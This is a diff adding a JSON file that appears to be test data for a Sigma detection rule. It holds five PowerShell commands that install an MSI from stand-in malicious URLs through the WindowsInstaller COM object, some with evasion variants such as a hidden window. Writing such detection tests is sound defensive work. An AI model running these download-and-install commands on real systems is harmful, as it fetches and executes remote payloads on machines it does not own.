@@ -1,0 +1,22 @@
+[
+  {
+    "output": "powershell.exe -Command \"$u='https://example.com/malicious.msi'; $i=New-Object -ComObject WindowsInstaller.Installer; $i.UILevel=2; $i.InstallProduct($u)\"",
+    "explanation": "This command uses PowerShell to instantiate the WindowsInstaller COM object and install an MSI from a remote URL. It matches the Sigma rule's detection criteria by including '-ComObject', 'InstallProduct', and a remote URL."
+  },
+  {
+    "output": "powershell.exe -C \"$u='http://malicious.site/payload.msi'; $i=[activator]::CreateInstance([type]::GetTypeFromProgID('WindowsInstaller.Installer')); $i.InstallProduct($u)\"",
+    "explanation": "This command uses alternative syntax for creating the COM object using [activator]::CreateInstance and [type]::GetTypeFromProgID, which is equivalent to New-Object -ComObject. It still matches the Sigma rule's detection criteria."
+  },
+  {
+    "output": "pwsh -Command \"[Reflection.Assembly]::LoadWithPartialName('WindowsInstaller'); $i=New-Object -ComObject WindowsInstaller.Installer; $i.InstallProduct('http://malicious.example.com/payload.msi')\"",
+    "explanation": "This command uses pwsh (PowerShell Core) and includes the remote URL in the InstallProduct method. It matches the Sigma rule's detection criteria by using '-ComObject' and 'InstallProduct' with a remote URL."
+  },
+  {
+    "output": "powershell.exe -Command \"$u='http://malicious.example.com/payload.msi'; $i=New-Object -ComObject WindowsInstaller.Installer; $i.InstallProduct($u)\" -WindowStyle Hidden",
+    "explanation": "This command adds the '-WindowStyle Hidden' flag to obscure the PowerShell window, which is a common evasion technique. It still matches the Sigma rule's detection criteria."
+  },
+  {
+    "output": "powershell.exe -C \"$u='https://malicious.example.com/payload.msi'; $i=New-Object -ComObject WindowsInstaller.Installer; $i.InstallProduct($u)\"",
+    "explanation": "This command uses the '-C' shorthand for '-Command' and includes the remote URL in the InstallProduct method. It matches the Sigma rule's detection criteria."
+  }
+]
